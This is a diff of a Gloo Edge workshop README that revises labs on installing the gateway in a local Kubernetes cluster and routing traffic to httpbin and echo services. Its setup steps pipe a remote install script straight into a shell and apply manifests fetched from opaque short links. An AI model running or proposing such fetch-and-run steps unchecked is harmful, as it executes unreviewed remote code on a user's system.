@@ -17,57 +17,53 @@ source ./scripts/assert.sh
 
 ![Monolith to microservices](images/monolith-to-microservices.png)
 
-Companies are modernizing their applications by splitting traditional monoliths into micro services.
+Companies are modernizing their applications by splitting traditional monoliths into microservices.
 
 ![Adopting Kubernetes](images/adopting-kubernetes.png)
 
-These micro services are generally deployed on Kubernetes and one of the first requirements is to expose some of those services to the outside world.
-
-![Kubernetes Ingress](images/kubernetes-ingress.png)
+These microservices are generally deployed on Kubernetes and one of the first requirements is to expose some of those services to the outside world.
 
 The natural way to expose them is through a standard Kubernetes Ingress Controller (NGINX, HAproxy, …).
 
-But it quickly becomes obvious that this approach is limited. The Ingress Kubernetes object doesn’t provide any way to define advanced routing policies, for example.
+![Kubernetes Ingress](images/kubernetes-ingress.png)
+
+But it quickly becomes obvious that this approach is limited. The Ingress Kubernetes object doesn’t provide any way to define advanced routing policies and neither implement cross-cutting concerns.
 
 ![Authentication at app level](images/authentication-at-app-level.png)
 
-More and more micro services are deployed and some functionalities (like external authentication) are being implemented by different application teams.
+More and more microservices are deployed and some functionalities (like external authentication) are implemented by different application teams.
 
-Those teams should focus on the business logic instead of reinventing the wheel.
+It would be a better usage of resources if the teams focus on the business logic instead of reinventing the wheel.
 
-A workaround implemented by many companies is to provide standard libraries to be used when developing new micro services, but it forces all the teams to use the same language, which is generating new challenges (slow down innovation, no global visibility for the security team, …).
+A workaround implemented by many companies is to provide standard libraries used across microservices. But it forces all the teams to use the same programming language, or maintain the library for multiple programming languages. Which generates new challenges (slow down innovation, no global visibility for the security team, and so on).
+
+Other functionalities such as rate limiting and Web Application Firewalls cannot easily be implemented in microservices and generally require an API Gateway or Firewall running outside of Kubernetes.
 
 ![Other capabilities](images/other-capabilities.png)
 
-Other functionalities (rate limiting, Web Application Firewall, …) can’t easily be implemented in the micro services and generally require an API Gateway or Firewall running outside of Kubernetes.
-
-It means that the configuration can’t be driven by yaml, so it’s not compatible with a modern Gitops deployment model.
+Services that are outside of the Kubernetes cluster, such as an external API Gateway (implementing rate limiting and WAF) usually requires other means to automate its configuration. Thus it is not compatible to the GitOps model -- unless, your team takes the tremendous effort of creating a Kubernetes Operator that configures an external service using YAML, or more specifically Kubernetes Custom Resource Definitions. 
 
 ![Kubernetes native API gateway](images/kubernetes-native-api-gateway.png)
 
-Implementing a modern Kubernetes-native API Gateway becomes a natural choice.
+Gloo Edge is a modern Kubernetes-native API Gateway that provides all of the functionality from within Kubernetes.
 
-We call it Kubernetes-native because it can be 100% configured by yaml (declarative API), so is compatible with a Gitops deployment model.
+We call it Kubernetes-native because it can be 100% configured by YAML (declarative API), so it is compatible with the GitOps deployment model.
 
-Authentication/Authorization can be implemented at the API Gateway level and relevant information (like the email address of the authenticated user) can be passed to the Upstream micro service (through a header, for example).
+Authentication/Authorization can be implemented at the API Gateway level and relevant information (like the email address of the authenticated user) can be passed to the Upstream microservice (through a header, for example).
 
-It also provides functionalities like rate limiting and Web Application Firewall, which can be configured through yaml.
-
-Finally, it provides more visibility to the security team.
-
-![Other workloads](images/other-workloads.png)
+It also provides functionalities like rate limiting and Web Application Firewall, which can be configured through YAML.
 
 Even if it runs on Kubernetes, a modern Kubernetes-native API Gateway can be used to route traffic to legacy applications (running in Virtual Machines, for example).
 
-And it can also sometimes provide interesting capabilities, like discovering functions running on AWS Lambda and route traffic to them.
+![Other workloads](images/other-workloads.png)
 
-![Gloo Edge architecture](images/gloo-edge-architecture.png)
+And it can also provide capabilities, like discovering functions running on AWS Lambda and route traffic to them.
 
-At Solo.io we have built a modern Kubernetes-native API Gateway built on Envoy.
+## Why is Gloo Edge build on top of Envoy?
 
-It provides all the capabilities described above (and much more !).
+Gloo Edge is a modern Kubernetes-native API Gateway built on Envoy. It provides all the capabilities described above. (and much more!)
 
-Why would you choose an API Gateway based on Envoy ?
+Why would you choose an API Gateway based on Envoy?
 
 There are many good reasons why.
 - First of all, it’s a high performance software written in C++.
@@ -87,17 +83,22 @@ Why would you choose Gloo Edge ?
 - A Kubernetes-native developer portal called Gloo Portal
 - And much more
 
+The above mentioned features enable Platform Engineers as well as Development Teams to implement powerful mechanisms to manage and secure traffic, implement access conrol, transform requests and responses, and gain observability over their services.
+
+However, the true power unfolds when combining the above mentioned capabilities to achieve a desired outcome. 
+In the labs that follow we present some of the common patterns that our customers use and provide a good entry point into the workings of Gloo Edge.
+
 
 
 ## Lab 1 - Deploy KinD cluster <a name="Lab-1"></a>
 
-From the terminal go to the `/home/solo/workshops/gloo-edge` directory:
+From within the VM open the terminal and navigate to the `/home/solo/workshops/gloo-edge` directory.
 
 ```
 cd /home/solo/workshops/gloo-edge
 ```
 
-Deploy a local Kubernetes cluster using this command:
+To create a local Kubernetes cluster execute the script below:
 
 ```bash
 ./scripts/deploy.sh 1 gloo-edge
@@ -115,6 +116,8 @@ The `check.sh` script will return immediately with no output if the cluster is r
 
 ## Lab 2 - Deploy Gloo Edge <a name="Lab-2"></a>
 
+With the cluster created our next step is to install Gloo Edge on the cluster. 
+
 
 
 <!--bash
@@ -123,34 +126,28 @@ var chai = require('chai');
 var expect = chai.expect;
 
 describe("Required environment variables should contain value", () => {
-  afterEach(function(done){
-    if(this.currentTest.currentRetry() > 0){
-      process.stdout.write(".");
-       setTimeout(done, 1000);
-    } else {
-      done();
-    }
-  });
-
   it("Gloo Edge licence environment variables should not be empty", () => {
     expect(process.env.LICENSE_KEY).to.not.be.empty
   });
 });
 EOF
-mocha ./test.js --retries=500 2> /dev/null
+echo "executing test gloo-edge/templates/steps/deploy-gloo-edge/tests/environment-variables.test.js.liquid"
+mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
 -->
 
-Run the commands below to deploy Gloo Edge Enterprise:
+Run the commands below to deploy the Gloo Edge Enterprise components:
+
+
 
 ```bash
-export GLOO_VERSION=v1.8.17
+export GLOO_VERSION=v1.10.1
 curl -sL https://run.solo.io/gloo/install | sh
 export PATH=$HOME/.gloo/bin:$PATH
-glooctl upgrade --release=$GLOO_VERSION
 
 helm repo add glooe https://storage.googleapis.com/gloo-ee-helm
+helm repo update
 helm upgrade --install gloo glooe/gloo-ee --namespace gloo-system \
-  --create-namespace --version 1.8.13 --set-string license_key=$LICENSE_KEY
+  --create-namespace --version 1.10.1 --set-string license_key=$LICENSE_KEY --devel
 ```
 
 <!--bash
@@ -175,32 +172,22 @@ describe("Check glooctl version", () => {
   });
 });
 EOF
-mocha ./test.js --retries=500 2> /dev/null
+echo "executing test gloo-edge/templates/steps/deploy-gloo-edge/tests/glooctl-version.test.js.liquid"
+mocha ./test.js --retries=50 --bail 2> /dev/null || exit 1
 -->
-
-Gloo Edge can also be deployed using a Helm chart.
 
 Use the following commands to wait for the Gloo Edge components to be deployed:
 
-```bash
-until kubectl get ns gloo-system
-do
-  sleep 1
-done
-
-printf "\nWaiting for all the gloo-system pods to become ready"
-until [ $(kubectl -n gloo-system get pods -o jsonpath='{range .items[*].status.containerStatuses[*]}{.ready}{"\n"}{end}' | grep false -c) -eq 0 ]; do
-  printf "%s" "."
-  sleep 1
-done
-printf "\n"
-```
-
-Set the environment variable corresponding to the endpoint of the Gateway:
+<!--bash
+sleep 2
+-->
 
 ```bash
-export ENDPOINT=$(kubectl -n gloo-system get svc gateway-proxy -o jsonpath='{.status.loadBalancer.ingress[0].*}')
+kubectl wait pod -n gloo-system --all \
+    --for=condition=Ready --timeout=120s
 ```
+With the components up and running, we are ready to showcase Gloo Edge with practical examples.
+
 
 
 
@@ -210,138 +197,123 @@ export ENDPOINT=$(kubectl -n gloo-system get svc gateway-proxy -o jsonpath='{.st
 
 In this step you will expose two services to the outside world using Gloo Edge.
 
-First let's deploy an application called **bookinfo** in `bookinfo` namespace:
+First, let's deploy the **httpbin** service. `httpbin` is an open source application useful to debug routing, headers in requests and responses, status codes, and so on. The public online version of it can be found at [httpbin.org](https://httpbin.org). 
+
+Begin by creating a namespace and then deploy the service.
 
 ```bash
-kubectl create ns bookinfo 
-kubectl -n bookinfo  apply -f https://raw.githubusercontent.com/istio/istio/1.7.3/samples/bookinfo/platform/kube/bookinfo.yaml
-kubectl delete deployment reviews-v1 reviews-v3 -n bookinfo
+kubectl create ns httpbin
+
+kubectl -n httpbin apply -f https://git.io/JyIRv
 ```
- 
-![Gloo Edge with Bookinfo](images/steps/traffic-management/bookinfo-v2.png)
 
-The bookinfo app has 3 versions of a microservice called reviews.  You will keep only the version 2 of the reviews microservice for this step and will add the other versions later.  An easy way to distinguish among the different versions in the web interface is to look at the stars: v1 displays no stars in the reviews, v2 displays black stars, and v3 displays red stars.
-
-Gloo Edge uses a discovery mechanism to create Upstreams automatically, but Upstreams can be also created manually using Kubernetes CRDs.
-
-After a few seconds, Gloo Edge will discover the newly created service and create an Upstream called  `bookinfo-productpage-9080` (Gloo Edge uses the convention `namespace-service-port` for the discovered Upstreams).
-
-To verify that the Upstream was created properly, run the following command: 
+We will additionally deploy the `echo` service. Which replies with a static text.
 
 ```bash
-until glooctl get upstream bookinfo-productpage-9080 2> /dev/null
+kubectl create ns echo
+
+kubectl -n echo apply -f https://git.io/JyIRn
+```
+
+The currently deployed services are shown in the figure below.
+
+![Gloo Edge with `httpbin` and the `echo` service](images/deployed-services.png)
+
+### Understanding the `Upstream` resource
+
+In Gloo Edge, an `Upstream` defines destinations where traffic can be routed. Upstreams tell Gloo Edge how to route traffic to the workloads behind it. Those workloads can be Kubernetes Services, aws EC2 instances, Lambda Functions, and so on.
+
+> Note: To learn more about `Upstreams` check the [Upstream API documentation](https://docs.solo.io/gloo-edge/latest/reference/api/github.com/solo-io/gloo/projects/gloo/api/v1/upstream.proto.sk/#upstream)
+
+This is cool and all, but do "I" have to create all the upstreams? *sob
+
+No, Gloo Edge does it for you! It uses a discovery mechanism to create upstreams automatically! This covers the majority of the cases, but whenever you are using a resource that is not automatically discovered, remember that you can create the upstream manually using Kubernetes CRs.
+
+After deploying the httpbin service, Gloo Edge discovers and creates an `Upstream` for it called `httpbin-httpbin-8000` (Gloo Edge uses the convention `<namespace>-<service>-<port>` for the discovered Upstreams).
+
+![Upstream discovery](images/creation-of-upstreams.png)
+Gloo Edge upstream discovery:
+
+- (1) Watches for Kubernetes Services
+- (2) Uses the information to create Upstream CR and applies those to the Kubernetes cluster 
+
+To verify that the Upstream was created, run the following command: 
+
+<!--bash
+echo waiting for upstream httpbin-httpbin-8000 to be discovered
+until glooctl get upstream httpbin-httpbin-8000 2> /dev/null
 do
-    echo waiting for upstream bookinfo-productpage-9080 to be discovered
+    printf '.'
     sleep 3
 done
-```
-
-It should return the discovered upstream with an `Accepted` status: 
-
-```
-+---------------------------+------------+----------+----------------------------+
-|         UPSTREAM          |    TYPE    |  STATUS  |          DETAILS           |
-+---------------------------+------------+----------+----------------------------+
-| bookinfo-productpage-9080 | Kubernetes | Accepted | svc name:      productpage |
-|                           |            |          | svc namespace: bookinfo    |
-|                           |            |          | port:          9080        |
-|                           |            |          |                            |
-+---------------------------+------------+----------+----------------------------+
-```
-
-Now, let's deploy the second application, called **httpbin** in the namespace `team1`.
-
-This application is very useful when you have to debug routing, headers in requests, responses, status codes, etc. The public online version of it can be found [here](http://httpbin.org/).
+printf '\n'
+-->
 
 ```bash
-kubectl create ns team1
-
-kubectl apply -f - <<EOF
-apiVersion: v1
-kind: ServiceAccount
-metadata:
-  name: httpbin
-  namespace: team1
----
-apiVersion: v1
-kind: Service
-metadata:
-  name: httpbin
-  namespace: team1
-  labels:
-    app: httpbin
-spec:
-  ports:
-  - name: http
-    port: 8000
-    targetPort: 80
-  selector:
-    app: httpbin
----
-apiVersion: apps/v1
-kind: Deployment
-metadata:
-  name: httpbin
-  namespace: team1
-spec:
-  replicas: 1
-  selector:
-    matchLabels:
-      app: httpbin
-      version: v1
-  template:
-    metadata:
-      labels:
-        app: httpbin
-        version: v1
-    spec:
-      serviceAccountName: httpbin
-      containers:
-      - image: docker.io/kennethreitz/httpbin
-        imagePullPolicy: IfNotPresent
-        name: httpbin
-        ports:
-        - containerPort: 80
-EOF
+glooctl get upstream httpbin-httpbin-8000
 ```
 
-To verify that the Upstream was created properly, run the following command: 
+The output shows the discovered upstream with an `Accepted` status: 
+
+```
++----------------------+------------+----------+------------------------+
+|       UPSTREAM       |    TYPE    |  STATUS  |        DETAILS         |
++----------------------+------------+----------+------------------------+
+| httpbin-httpbin-8000 | Kubernetes | Accepted | svc name:      httpbin |
+|                      |            |          | svc namespace: httpbin |
+|                      |            |          | port:          8000    |
+|                      |            |          |                        |
++----------------------+------------+----------+------------------------+
+```
+
+Similarily, Gloo Edge has created upstreams for the `echo` service and all the other existing services in the cluster. To list all of the upstreams execute the following command:
 
 ```bash
-until glooctl get upstream team1-httpbin-8000 2> /dev/null
-do
-    echo waiting for upstream team1-httpbin-8000 to be discovered
-    sleep 3
-done
+glooctl get upstream 
 ```
 
-It should return the discovered upstream with an `Accepted` status: 
+The upstream resources are stored in the cluster as Kubernetes Custom Resources. You can query those using kubectl, as shown below:
 
 ```
-+--------------------+------------+----------+------------------------+
-|      UPSTREAM      |    TYPE    |  STATUS  |        DETAILS         |
-+--------------------+------------+----------+------------------------+
-| team1-httpbin-8000 | Kubernetes | Accepted | svc name:      httpbin |
-|                    |            |          | svc namespace: team1   |
-|                    |            |          | port:          8000    |
-|                    |            |          |                        |
-+--------------------+------------+----------+------------------------+
+kubectl get upstreams -n gloo-system 
+NAME                                                   AGE
+default-kubernetes-443                                 28m
+echo-echo-v1-8080                                      5m3s
+extauth                                                28m
+gloo-system-extauth-8083                               28m
+gloo-system-gateway-443                                28m
+gloo-system-gateway-proxy-443                          28m
+gloo-system-gateway-proxy-80                           28m
+gloo-system-gloo-9976                                  28m
+gloo-system-gloo-9977                                  28m
+gloo-system-gloo-9979                                  28m
+gloo-system-gloo-9988                                  28m
+gloo-system-gloo-fed-console-10101                     28m
+gloo-system-gloo-fed-console-8081                      28m
+gloo-system-gloo-fed-console-8090                      28m
+gloo-system-glooe-grafana-80                           28m
+gloo-system-glooe-prometheus-kube-state-metrics-8080   28m
+gloo-system-glooe-prometheus-server-80                 28m
+gloo-system-rate-limit-18081                           28m
+gloo-system-redis-6379                                 28m
+httpbin-httpbin-8000                                   5m19s
+kube-system-kube-dns-53                                28m
+kube-system-kube-dns-9153                              28m
+rate-limit                                             28m
 ```
 
-### Routing to a Kubernetes Service 
+### Using `VirtualServices` you can route traffic to an `Upstream`
 
-Now that your two Upstream CR have been created, you need to create the resources to route the traffic to them.
+`VirtualService` is another Custom Resource Definition created by Gloo Edge. Those configure the Envoy proxy to route traffic to upstreams. Because the upstreams are already created, all we need to do to is expose and route traffic to those with a virtual service. 
 
-First, you create a Virtual Service. For bookinfo under `/` and for httpbin under `/not-secured`.
-
-Please, notice that the order matters.
+Let's create a Virtual Service that routes all incoming traffic to the `httpbin` service.
 
 ```bash
 kubectl apply -f - <<EOF
 apiVersion: gateway.solo.io/v1
 kind: VirtualService
 metadata:
-  name: demo
+  name: vs
   namespace: gloo-system
 spec:
   virtualHost:
@@ -353,88 +325,160 @@ spec:
         routeAction:
           single:
             upstream:
-              name: bookinfo-productpage-9080
+              name: httpbin-httpbin-8000
               namespace: gloo-system
 EOF
 ```
-
-The creation of the Virtual Service exposes the Kubernetes service through the gateway.
-
-You can access the application using the web browser by running the following command:
+Now you can access the `httpbin` application in the web browser by running the following command:
 
 ```
-/opt/google/chrome/chrome http://${ENDPOINT}/productpage
+/opt/google/chrome/chrome $(glooctl proxy url)
 ```
 
-It should return the bookinfo application webpage. Note that the review stars are black (v2).
+> Note: The nested command `glooctl proxy url` returns the endpoint in which the Gloo Edge Envoy proxy is exposed. Take the time and investigate `glooctl` and the utilities it exposes.
 
-![Bookinfo Web Interface](images/steps/traffic-management/bookinfo-web-interface.png)
+On the web browser you'll see the `httpbin` application webpage.
 
-Now, let's enable the httpbin route to be matched before bookinfo:
+![`httpbin` Web Interface](images/httpbin-ui.png)
+
+Now, create another route entry for the `echo` service. But we got to ask ourselves on what property of the request should we take the routing decision? Gloo Edge is versatile and you can route based on many properties such as: headers, hostname, path based routing, and so on.
+
+While surfing the web regular users will type the hostname such as `echo.solo.io` in the web browser. After that the browser uses Domain Name Servers (DNS) configured on the operating system to resolve the typed hostname to an IP address.
+
+After the resolution a TCP connection is initiated to that IP address and the hostname `echo.solo.io` is added to the request as an HTTP Header, specifically the `Host` header for HTTP/1, and as the `:authority` header for HTTP/2. Because Envoy internally uses the HTTP/2 version of this header we refer to it with the latter header.
+
+In order too route traffic to the `echo` service for the hostname `echo.solo.io` we define the following virtual service.
 
 ```bash
 kubectl apply -f - <<EOF
 apiVersion: gateway.solo.io/v1
 kind: VirtualService
 metadata:
-  name: demo
+  name: vs
   namespace: gloo-system
 spec:
   virtualHost:
     domains:
       - '*'
     routes:
-# ------------- Another route which is parsed before ------------------
       - matchers:
-          - prefix: /not-secured
+          - prefix: /
+            headers:
+            - name: ":authority"
+              value: "echo.solo.io"
         routeAction:
           single:
             upstream:
-              name: team1-httpbin-8000
+              name: echo-echo-v1-8080
               namespace: gloo-system
-        options:
-          prefixRewrite: '/'
-# ----------------------------------------------------------------------
       - matchers:
           - prefix: /
         routeAction:
           single:
             upstream:
-              name: bookinfo-productpage-9080
+              name: httpbin-httpbin-8000
               namespace: gloo-system
 EOF
 ```
 
-And to access the httpbin application:
+Because public DNS servers don't have the entry (that we just made up), we have to manually specify the Host header in the request as shown below:
 
 ```
-/opt/google/chrome/chrome http://${ENDPOINT}/not-secured/get
+curl -H "Host: echo.solo.io" $(glooctl proxy url)/
 ```
 
-It should return a json object with details regarding your own request. Something similar to:
+The server responds with `version-1`, which indicates that traffic was properly routed to the `echo` service using the host header.
+Instead of typing the host header in each request we can configure the systems hosts file to resolve our sample domains. 
+
+> **NOTE:** The `hosts` file is the first stop for the operating system to resolve a hostname. Thus when configuring the hostname with static entries those will be resolved by all applications.
+
+Configure your hosts file to resolve the hostnames to the IP address of the proxy by executing the following command:
 
 ```
-{
-  "args": {},
-  "headers": {
-    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
-    "Accept-Encoding": "gzip, deflate",
-    "Accept-Language": "en-GB,en;q=0.9,es-ES;q=0.8,es;q=0.7,sk-SK;q=0.6,sk;q=0.5,en-US;q=0.4",
-    "Cache-Control": "max-age=0",
-    "Host": "x.x.x.x",
-    "Upgrade-Insecure-Requests": "1",
-    "User-Agent": "xxxx",
-    "X-Envoy-Expected-Rq-Timeout-Ms": "15000",
-    "X-Envoy-Original-Path": "/not-secured/get"
-  },
-  "origin": "x.x.x.x",
-  "url": "http://x.x.x.x/get"
-}
+PROXY_IP=$(kubectl get svc -n gloo-system gateway-proxy \
+    -o jsonpath='{.status.loadBalancer.ingress[0].*}')
+
+echo | sudo tee -a /etc/hosts
+echo "$PROXY_IP echo.solo.io" | sudo tee -a /etc/hosts
+echo "$PROXY_IP httpbin.solo.io" | sudo tee -a /etc/hosts
 ```
+
+<!--bash
+if ! grep -q 'echo.solo.io' /etc/hosts; then
+  PROXY_IP=$(kubectl get svc -n gloo-system gateway-proxy \
+      -o jsonpath='{.status.loadBalancer.ingress[0].*}')
+
+  echo | sudo tee -a /etc/hosts
+  echo "$PROXY_IP echo.solo.io" | sudo tee -a /etc/hosts
+  echo "$PROXY_IP httpbin.solo.io" | sudo tee -a /etc/hosts
+fi
+-->
+To test that the hostnames are resolved open chrome and instead of the IP use the hostname. You can do so by running the following command:
+
+```
+/opt/google/chrome/chrome http://echo.solo.io
+```
+
+And sure enough you should see the static text "version-1"
+
+### Gloo Edge configuration to route traffic to a workload
+
+There are quite a few resources involved to route traffic to the upstream. Those are visualized in the figure below.
+
+![Gloo Edge configuration](images/gloo-edge-config.png)
+
+We already got to know the `VirtualService` and the `Upstream` resource definitions.  So let's take a closer look at the `Gateway` resource. 
+
+### `Gateway` configures the proxy to admit traffic
+
+The `Gateway` resource configures the proxy to admit traffic for an address and a port.
+
+As most services will want to expose services on port 443 and port 80, gateways that expose those ports are created by default. Verify that by listing all `Gateway` resources. 
+
+```
+kubectl get gateway -n gloo-system
+```
+
+Which prints the following.
+
+```
+NAME                AGE
+gateway-proxy       58m
+gateway-proxy-ssl   58m
+```
+
+To learn more let's print the denfinition of the `Gateway` named `gateway-proxy`.
+
+```
+kubectl get gateway gateway-proxy -n gloo-system -o yaml
+```
+
+This prints out the following definition:
+
+```
+apiVersion: gateway.solo.io/v1
+kind: Gateway
+metadata:
+  name: gateway-proxy
+  namespace: gloo-system
+spec:
+  bindAddress: '::'
+  bindPort: 8080
+  httpGateway: {}
+  proxyNames:
+  - gateway-proxy
+  useProxyProto: false
+```
+
+This configures the proxy to admit traffic on port 8080 for all addresses. When checking the gateway `gateway-proxy-ssl` you'll see that it listens on port 8443 and additionaly sets the ssl property to true.
 
 ### Delegation
 
-Gloo Edge provides a feature referred to as delegation. Delegation allows a complete routing configuration to be assembled from separate config objects. The root config object delegates responsibility to other objects, forming a tree of config objects. The tree always has a Virtual Service as its root, which delegates to any number of Route Tables. Route Tables can further delegate to other Route Tables.
+In the previous example, we set up a virtual service that routes traffic to two different applications. Those applications might be operated by different teams. At the surface this seems fine, but it violates the isolation principle of multi tenant environments. Basically, if one team makes changes to the Virtual Service (such as prototyping with a new app), a missconfiguration of theirs can break the routing for the apps of other teams. 
+
+> Multi-tenant environments require tenant isolation to ensure that the misshaps of one tenant don't impact other tenants.
+
+Gloo Edge provides a feature referred to as _delegation_ that makes routing configuration multi-tenant friendly. Using delegation routing configuration can be assembled from separate config objects. The root config object delegates responsibility to other objects, forming a tree of config objects. The tree always has a virtual service as its root, which delegates to any number of route tables. Route tables can further delegate to other route tables.
 
 Use cases for delegation include:
 
@@ -444,10 +488,11 @@ Use cases for delegation include:
 - Simplifying very large routing configurations for a single Virtual Service
 - Restricting ownership of routing configuration for a tenant to a subset of the whole Virtual Service.
 
-Let's rewrite your Virtual Service to delegate the routing to a Route Table.
+![Delegation](images/delegation.png)
 
-First resource is the delegated Route Table. Second resource is a Virtual Service. Notice that there is a new `delegateAction` referencing the just created Route Table.
+Let's rewrite your Virtual Service to delegate the routing to a `RouteTable`.
 
+First resource is the delegated Route Table. Second resource is a Virtual Service. Notice that there is a new `delegateAction` referencing the just created `RouteTable`.
 
 ```bash
 kubectl apply -f - <<EOF
@@ -455,24 +500,26 @@ kubectl apply -f - <<EOF
 apiVersion: gateway.solo.io/v1
 kind: RouteTable
 metadata:
-  name: httpbin-routetable
-  namespace: team1
+  name: echo-routetable
+  namespace: echo
 spec:
   routes:
     - matchers:
-        - prefix: /not-secured
-      options:
-        prefixRewrite: '/'
+        - prefix: /
+          headers:
+          - name: ":authority"
+            value: "echo.solo.io"
       routeAction:
-          single:
-            upstream:
-              name: team1-httpbin-8000
-              namespace: gloo-system
+        single:
+          upstream:
+            name: echo-echo-v1-8080
+            namespace: gloo-system
 # ---------------------------------------------------------
+---
 apiVersion: gateway.solo.io/v1
 kind: VirtualService
 metadata:
-  name: demo
+  name: vs
   namespace: gloo-system
 spec:
   virtualHost:
@@ -480,36 +527,42 @@ spec:
       - '*'
     routes:
       - matchers:
-          - prefix: /not-secured
+        - prefix: /
+          headers:
+          - name: ":authority"
+            value: "echo.solo.io"
 # ------------- Delegation action by reference ------------
         delegateAction:
           ref:
-            name: 'httpbin-routetable'
-            namespace: 'team1'
+            name: 'echo-routetable'
+            namespace: 'echo'
 # ---------------------------------------------------------
       - matchers:
           - prefix: /
         routeAction:
           single:
             upstream:
-              name: bookinfo-productpage-9080
+              name: httpbin-httpbin-8000
               namespace: gloo-system
 EOF
 ```
 
+Breaking the route table from the virtual service enables seperation of concerns. Development teams can maintain the route table and configure properties specific for their services. Meanwhile, administrators can define higher level options. Such as firewall rules, authentication of requests, and so on.
+
 ### Delegation By Label Selector
 
-Another way to delegate is to use labels. This approach helps you to create dynamic references. Let's update your Route Table to add a label. Then, the label will be used in the Virtual Service resource.
+Another way to delegate is using labels. This approach helps you to create dynamic references thus you don't need to change the Virtual service for every new route table.
 
-Let's make both changes:
+Let's add a label to the previously created route table.
 
 ```bash
 kubectl apply -f - <<EOF
+---
 apiVersion: gateway.solo.io/v1
 kind: RouteTable
 metadata:
-  name: httpbin-routetable
-  namespace: team1
+  name: echo-routetable
+  namespace: echo
 # ------------- Label to use as dynamic reference ---------
   labels:
     application-owner: team1
@@ -517,19 +570,27 @@ metadata:
 spec:
   routes:
     - matchers:
-        - prefix: /not-secured
-      options:
-        prefixRewrite: '/'
+        - prefix: /
+          headers:
+          - name: ":authority"
+            value: "echo.solo.io"
       routeAction:
-          single:
-            upstream:
-              name: team1-httpbin-8000
-              namespace: gloo-system
+        single:
+          upstream:
+            name: echo-echo-v1-8080
+            namespace: gloo-system
+EOF
+```
+
+And then configure the virtual service to select it using labels.
+
+```bash
+kubectl apply -f - <<EOF
 ---
 apiVersion: gateway.solo.io/v1
 kind: VirtualService
 metadata:
-  name: demo
+  name: vs
   namespace: gloo-system
 spec:
   virtualHost:
@@ -537,12 +598,15 @@ spec:
       - '*'
     routes:
       - matchers:
-          - prefix: /not-secured
+        - prefix: /
+          headers:
+          - name: ":authority"
+            value: "echo.solo.io"
 # ------------- Delegation by label selector --------------
         delegateAction:
           selector:
             namespaces:
-              - team1
+              - echo
             labels:
               application-owner: team1
 # ---------------------------------------------------------
@@ -551,130 +615,190 @@ spec:
         routeAction:
           single:
             upstream:
-              name: bookinfo-productpage-9080
+              name: httpbin-httpbin-8000
               namespace: gloo-system
 EOF
 ```
 
+Now teams within the `echo` namespace can create multiple route tables on how to route traffic to their serivces without making changes to the virtual service. You can try the same commands as previous and everything works the same.
 
 ### Routing to Multiple Upstreams
 
-In many cases, you need to route traffic to two different versions of an application to test a new feature. In this step, you are going to update the Virtual Service to route traffic to two different Upstreams:
+In many cases, you need to route traffic to two different versions of an application. Such as testing a new feature using A/B Testing, and so on. In this step, you are going to update the Virtual Service to route traffic to two different `Upstreams`. 
 
-The first step is to create a new deployment of the **bookinfo** application, this time with the version 3 of the reviews microservice: 
+Begin by creating a new deployment of the **echo** service (which represents another upstream), this time it returns the text `version-2`. Apply it to the cluster: 
 
 ```bash
-kubectl create ns bookinfo-beta 
-kubectl -n bookinfo-beta apply -f https://raw.githubusercontent.com/istio/istio/1.7.3/samples/bookinfo/platform/kube/bookinfo.yaml
-kubectl delete deployment reviews-v1 reviews-v2 -n bookinfo-beta
+kubectl -n echo apply -f https://git.io/JyqPy
 ```
 
-![Weighted Routing Diagram](images/steps/traffic-management/bookinfo-v3.png)
+Verify that the upstream for the second version of the echo service is created.
 
-Verify that the Upstream for the beta application was created, using the following command: 
-
-
-```bash
-until glooctl get upstream bookinfo-beta-productpage-9080 2> /dev/null
+<!--bash
+echo waiting for upstream echo-echo-v2-8080 to be discovered
+until glooctl get upstream echo-echo-v2-8080 2> /dev/null
 do
-    echo waiting for upstream bookinfo-beta-productpage-9080 to be discovered
     sleep 3
 done
+-->
+
+```
+glooctl get upstream echo-echo-v2-8080
 ```
 
-Now you can route to multiple Upstreams by updating the Virtual Service as follow: 
+This will print the following:
+
+```
++-------------------+------------+----------+------------------------+
+|     UPSTREAM      |    TYPE    |  STATUS  |        DETAILS         |
++-------------------+------------+----------+------------------------+
+| echo-echo-v2-8080 | Kubernetes | Accepted | svc name:      echo-v2 |
+|                   |            |          | svc namespace: echo    |
+|                   |            |          | port:          8080    |
+|                   |            |          |                        |
++-------------------+------------+----------+------------------------+
+```
+
+You can route to multiple upstreams by updating the route table as follows: 
 
 ```bash
 kubectl apply -f - <<EOF
 apiVersion: gateway.solo.io/v1
-kind: VirtualService
+kind: RouteTable
 metadata:
-  name: demo
-  namespace: gloo-system
+  name: echo-routetable
+  namespace: echo
+  labels:
+    application-owner: team1
 spec:
-  virtualHost:
-    domains:
-      - '*'
-    routes:
-      - matchers:
-          - prefix: /not-secured
-        delegateAction:
-          selector:
-            namespaces:
-              - team1
-            labels:
-              application-owner: team1
-      - matchers:
-          - prefix: /
-        routeAction:
+  routes:
+    - matchers:
+        - prefix: /
+          headers:
+          - name: ":authority"
+            value: "echo.solo.io"
+      routeAction:
 # ----------------------- Multi Destination ------------------
-            multi:
-                destinations:
-                - weight: 5
-                  destination:
-                      upstream:
-                          name: bookinfo-productpage-9080
-                          namespace: gloo-system
-                - weight: 5
-                  destination:
-                      upstream:
-                          name: bookinfo-beta-productpage-9080
-                          namespace: gloo-system
+        multi:
+            destinations:
+            - weight: 5
+              destination:
+                  upstream:
+                      name: echo-echo-v1-8080
+                      namespace: gloo-system
+            - weight: 5
+              destination:
+                  upstream:
+                      name: echo-echo-v2-8080
+                      namespace: gloo-system
 # ------------------------------------------------------------
 EOF
 ```
 
-You should see either the **black** star reviews (v2) or the new **red** star reviews (v3) when refreshing the page.
+After applying the updated `RouteTable`, the proxy splits traffic equally accross versions.
 
-![Bookinfo Web Interface with v3](images/steps/traffic-management/bookinfo-web-interface-with-v3.png)
+![Weighted Routing Diagram](images/weighted-routing.png)
+
+You can verify that requests are load balanced equally by refreshing the page and verifying that the versions switch between **version-1** and **version-2** approximately equally. Or execute the command below that makes 10 requests in a row.
+
+```
+for i in {1..10}; do curl -s echo.solo.io; done
+```
+
+Output:
+
+```
+version-1
+version-2
+version-2
+version-1
+...
+```
+
+The output shows that the traffic is split across the version 1 and 2 of the echo application. This allows teams to gradually release traffic to a new version of an application, and such scopes the misshaps to only a small percentage of your users (in case there was something wrong with the new version of the service).
+
+> NOTE: The change was entirely done in the RouteTable. The RouteTable resided within the teams namespace. Thus in multi tenant environments other teams are protected from the missconfigurations of each other.
 
 <!--bash
 cat <<'EOF' > ./test.js
 const helpers = require('./tests/chai-http');
 
